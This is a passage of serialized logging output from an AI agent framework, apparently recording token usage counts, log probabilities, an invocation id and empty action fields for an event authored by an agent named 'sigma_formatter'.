    modality=<MediaModality.TEXT: 'TEXT'>,\n      token_count=8499\n    ),\n  ],\n  prompt_token_count=10322,\n  prompt_tokens_details=[\n    ModalityTokenCount(\n      modality=<MediaModality.TEXT: 'TEXT'>,\n      token_count=10322\n    ),\n  ],\n  thoughts_token_count=2075,\n  total_token_count=20896,\n  traffic_type=<TrafficType.ON_DEMAND: 'ON_DEMAND'>\n), live_session_resumption_update=None, input_transcription=None, output_transcription=None, avg_logprobs=-0.058954427629123646, logprobs_result=None, cache_metadata=None, citation_metadata=None, interaction_id=None, invocation_id='e-1999038d-6b21-4316-8475-3e5828542ffd', author='sigma_formatter', actions=EventActions(skip_summarization=None, state_delta={}, artifact_delta={}, transfer_to_agent=None, escalate=None, requested_auth_configs={}, requested_tool_confirmations={}, compaction=None, end_of_agent=None, agent_state=None, rewind_before_invocation_id=None), long_running_tool_ids=None, branch=None, id='e125d875-906d-4b06-9222-7d365260be7f', timestamp=1770508231.911572)]"
}